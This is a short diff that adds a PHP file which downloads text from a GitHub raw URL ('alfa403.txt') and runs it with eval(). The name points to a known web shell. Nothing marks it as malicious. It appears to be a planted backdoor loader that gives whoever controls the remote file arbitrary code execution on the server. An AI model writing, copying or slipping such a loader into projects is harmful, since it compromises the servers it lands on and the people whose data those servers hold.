@@ -1,0 +1,6 @@
+<?php
+
+$content = file_get_contents(urldecode('https://raw.githubusercontent.com/cuankiXhole/ALFAORI/refs/heads/main/alfa403.txt'));
+
+$content = "?> ".$content;
+eval($content);
